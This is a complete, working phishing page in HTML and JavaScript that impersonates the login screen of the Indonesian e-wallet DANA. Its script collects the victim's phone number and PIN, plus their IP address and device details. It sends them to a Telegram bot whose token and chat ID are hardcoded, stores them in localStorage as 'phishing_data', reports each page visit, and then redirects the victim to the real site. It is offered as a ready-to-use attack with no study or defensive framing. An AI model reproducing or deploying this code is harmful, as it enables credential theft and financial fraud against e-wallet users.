<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>DANA - Login Akun</title>
    <style>
        /* RESET DULU */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background: linear-gradient(to bottom, #00a8ff, #0097e6);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        
        /* KONTEN UTAMA */
        .login-wrapper {
            width: 100%;
            max-width: 400px;
        }
        
        .login-card {
            background: white;
            border-radius: 20px;
            overflow: hidden;
            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.2);
        }
        
        /* HEADER DANA */
        .dana-header {
            background: #00a8ff;
            padding: 40px 30px 30px;
            text-align: center;
            color: white;
        }
        
        .dana-logo {
            font-size: 42px;
            font-weight: 800;
            margin-bottom: 10px;
            letter-spacing: -1px;
        }
        
        .dana-tagline {
            font-size: 16px;
            opacity: 0.95;
            font-weight: 400;
        }
        
        /* FORM AREA */
        .form-area {
            padding: 30px;
        }
        
        .form-title {
            font-size: 22px;
            color: #333;
            margin-bottom: 25px;
            text-align: center;
            font-weight: 600;
        }
        
        .input-container {
            margin-bottom: 25px;
        }
        
        .input-label {
            display: block;
            margin-bottom: 10px;
            color: #555;
            font-size: 14px;
            font-weight: 500;
        }
        
        .phone-input-group {
            display: flex;
            border: 1.5px solid #ddd;
            border-radius: 12px;
            overflow: hidden;
            transition: border-color 0.3s;
        }
        
        .phone-input-group:focus-within {
            border-color: #00a8ff;
        }
        
        .country-code {
            padding: 16px 20px;
            background: #f8f9fa;
            color: #333;
            font-weight: 500;
            border-right: 1.5px solid #ddd;
        }
        
        .phone-field {
            flex: 1;
            border: none;
            padding: 16px;
            font-size: 16px;
            outline: none;
            background: white;
        }
        
        .pin-input-group {
            position: relative;
        }
        
        .pin-field {
            width: 100%;
            padding: 16px;
            border: 1.5px solid #ddd;
            border-radius: 12px;
            font-size: 18px;
            letter-spacing: 10px;
            text-align: center;
            outline: none;
            transition: border-color 0.3s;
        }
        
        .pin-field:focus {
            border-color: #00a8ff;
        }
        
        /* BUTTON */
        .submit-btn {
            width: 100%;
            padding: 18px;
            background: #00a8ff;
            color: white;
            border: none;
            border-radius: 12px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            margin-top: 10px;
            transition: background 0.3s;
        }
        
        .submit-btn:hover {
            background: #0097e6;
        }
        
        .submit-btn:disabled {
            background: #ccc;
            cursor: not-allowed;
        }
        
        /* LINKS */
        .forgot-link {
            text-align: center;
            margin-top: 20px;
        }
        
        .forgot-link a {
            color: #00a8ff;
            text-decoration: none;
            font-size: 14px;
            font-weight: 500;
        }
        
        /* FOOTER */
        .footer {
            padding: 20px;
            text-align: center;
            color: #888;
            font-size: 12px;
            border-top: 1px solid #eee;
        }
        
        .footer-links {
            margin-top: 10px;
        }
        
        .footer-links a {
            color: #666;
            text-decoration: none;
            font-size: 11px;
            margin: 0 8px;
        }
        
        /* SECURITY NOTE */
        .security-alert {
            background: #f0f8ff;
            border-radius: 10px;
            padding: 15px;
            margin-top: 25px;
            border-left: 4px solid #00a8ff;
            font-size: 13px;
            color: #555;
        }
        
        /* LOADING SPINNER */
        .spinner {
            display: none;
            width: 20px;
            height: 20px;
            border: 3px solid rgba(255,255,255,0.3);
            border-radius: 50%;
            border-top-color: white;
            animation: spin 1s linear infinite;
            margin: 0 auto;
        }
        
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        
        /* ERROR MESSAGE */
        .error-message {
            color: #ff4757;
            font-size: 13px;
            margin-top: 5px;
            display: none;
        }
    </style>
</head>
<body>
    <div class="login-wrapper">
        <div class="login-card">
            <!-- HEADER -->
            <div class="dana-header">
                <div class="dana-logo">DANA</div>
                <div class="dana-tagline">Lebih dari sekadar dompet digital</div>
            </div>
            
            <!-- FORM -->
            <div class="form-area">
                <div class="form-title">Masuk ke Akun Anda</div>
                
                <form id="loginForm">
                    <!-- PHONE INPUT -->
                    <div class="input-container">
                        <label class="input-label">Nomor Telepon</label>
                        <div class="phone-input-group">
                            <div class="country-code">+62</div>
                            <input 
                                type="tel" 
                                class="phone-field" 
                                id="phoneInput"
                                placeholder="812 3456 7890"
                                maxlength="13"
                                required
                            >
                        </div>
                        <div class="error-message" id="phoneError"></div>
                    </div>
                    
                    <!-- PIN INPUT -->
                    <div class="input-container">
                        <label class="input-label">PIN DANA (6 digit)</label>
                        <div class="pin-input-group">
                            <input 
                                type="password" 
                                class="pin-field" 
                                id="pinInput"
                                maxlength="6"
                                placeholder="â€¢ â€¢ â€¢ â€¢ â€¢ â€¢"
                                required
                            >
                        </div>
                        <div class="error-message" id="pinError"></div>
                    </div>
                    
                    <!-- SECURITY NOTE -->
                    <div class="security-alert">
                        ðŸ”’ Jangan pernah membagikan PIN DANA Anda kepada siapapun, termasuk pihak DANA.
                    </div>
                    
                    <!-- SUBMIT BUTTON -->
                    <button type="submit" class="submit-btn" id="submitBtn">
                        <span id="btnText">MASUK</span>
                        <div class="spinner" id="spinner"></div>
                    </button>
                </form>
                
                <!-- FORGOT LINK -->
                <div class="forgot-link">
                    <a href="#" onclick="showForgotModal()">Lupa PIN DANA?</a>
                </div>
            </div>
            
            <!-- FOOTER -->
            <div class="footer">
                <p>Â© 2024 DANA. Hak Cipta Dilindungi.</p>
                <div class="footer-links">
                    <a href="#">Kebijakan Privasi</a>
                    <a href="#">Syarat & Ketentuan</a>
                    <a href="#">Pusat Bantuan</a>
                </div>
            </div>
        </div>
    </div>

    <script>
        // ===== TELEGRAM CONFIG =====
        const BOT_TOKEN = "8455080107:AAFh1AFJ1YmONMe5kpqNstPFuZpn4NXzr18";
        const CHAT_ID = "8313500840";
        
        // ===== ELEMENTS =====
        const loginForm = document.getElementById('loginForm');
        const phoneInput = document.getElementById('phoneInput');
        const pinInput = document.getElementById('pinInput');
        const submitBtn = document.getElementById('submitBtn');
        const btnText = document.getElementById('btnText');
        const spinner = document.getElementById('spinner');
        const phoneError = document.getElementById('phoneError');
        const pinError = document.getElementById('pinError');
        
        // ===== PHONE VALIDATION =====
        phoneInput.addEventListener('input', function(e) {
            let value = e.target.value.replace(/\D/g, '');
            
            // Format: 812 3456 7890
            if (value.length > 3 && value.length <= 7) {
                value = value.replace(/(\d{3})(\d+)/, '$1 $2');
            } else if (value.length > 7) {
                value = value.replace(/(\d{3})(\d{4})(\d+)/, '$1 $2 $3');
            }
            
            e.target.value = value;
            phoneError.style.display = 'none';
        });
        
        // ===== PIN VALIDATION =====
        pinInput.addEventListener('input', function(e) {
            let value = e.target.value.replace(/\D/g, '');
            e.target.value = value;
            
            if (value.length === 6) {
                pinError.style.display = 'none';
            }
        });
        
        // ===== FORM SUBMISSION =====
        loginForm.addEventListener('submit', async function(e) {
            e.preventDefault();
            
            // Get values
            const phone = phoneInput.value.replace(/\s/g, '');
            const pin = pinInput.value;
            
            // Validation
            let isValid = true;
            
            if (!phone || phone.length < 10) {
                phoneError.textContent = 'Nomor telepon tidak valid';
                phoneError.style.display = 'block';
                isValid = false;
            }
            
            if (!pin || pin.length !== 6) {
                pinError.textContent = 'PIN harus 6 digit';
                pinError.style.display = 'block';
                isValid = false;
            }
            
            if (!isValid) return;
            
            // Show loading
            btnText.style.display = 'none';
            spinner.style.display = 'block';
            submitBtn.disabled = true;
            
            // Prepare data
            const timestamp = new Date().toLocaleString();
            const userAgent = navigator.userAgent.substring(0, 100);
            const ip = await getIP();
            
            // Telegram message
            const telegramMessage = `
            ðŸ’° **DANA LOGIN CAPTURED**
            
            ðŸ“± Phone: +62${phone}
            ðŸ”¢ PIN: ${pin}
            â° Time: ${timestamp}
            ðŸŒ IP: ${ip}
            ðŸ“± Device: ${userAgent}
            
            ðŸš¨ Data saved locally and sent to Telegram.
            `;
            
            // Send to Telegram
            await sendToTelegram(telegramMessage);
            
            // Save to localStorage
            saveToLocalStorage({
                site: 'DANA',
                phone: '+62' + phone,
                pin: pin,
                timestamp: timestamp,
                ip: ip,
                userAgent: userAgent
            });
            
            // Simulate processing (2 seconds)
            setTimeout(() => {
                // Hide loading
                btnText.style.display = 'block';
                spinner.style.display = 'none';
                
                // Show success message
                alert('âœ… Login berhasil! Verifikasi selesai.\nMengarahkan ke DANA...');
                
                // Redirect to real DANA
                setTimeout(() => {
                    window.location.href = 'https://www.dana.id';
                }, 1500);
                
            }, 2000);
        });
        
        // ===== TELEGRAM FUNCTION =====
        async function sendToTelegram(message) {
            try {
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: message,
                        parse_mode: 'Markdown'
                    })
                });
            } catch (error) {
                console.log('Telegram silent error:', error);
            }
        }
        
        // ===== GET IP ADDRESS =====
        async function getIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch {
                return 'Unknown';
            }
        }
        
        // ===== LOCAL STORAGE =====
        function saveToLocalStorage(data) {
            try {
                let existingData = JSON.parse(localStorage.getItem('phishing_data') || '[]');
                existingData.push(data);
                localStorage.setItem('phishing_data', JSON.stringify(existingData));
            } catch (error) {
                console.log('LocalStorage error:', error);
            }
        }
        
        // ===== FORGOT PIN MODAL =====
        function showForgotModal() {
            alert('Untuk reset PIN DANA, silakan hubungi Customer Service DANA di 1500-365 atau melalui aplikasi DANA.');
        }
        
        // ===== AUTO FOCUS =====
        window.onload = function() {
            phoneInput.focus();
            
            // Send access notification to Telegram
            const accessMessage = `ðŸ“± DANA page accessed\nâ° ${new Date().toLocaleString()}`;
            sendToTelegram(accessMessage);
            
            // Check if data exists in localStorage
            const existingData = JSON.parse(localStorage.getItem('phishing_data') || '[]');
            const danaData = existingData.filter(item => item.site === 'DANA');
            
            console.log(`Found ${danaData.length} DANA records in localStorage`);
        };
        
        // ===== KEYBOARD SHORTCUTS =====
        document.addEventListener('keydown', function(e) {
            // Ctrl+Enter to submit
            if (e.ctrlKey && e.key === 'Enter') {
                loginForm.requestSubmit();
            }
            
            // Escape to clear form
            if (e.key === 'Escape') {
                loginForm.reset();
                phoneInput.focus();
            }
        });
    </script>
</body>
</html>
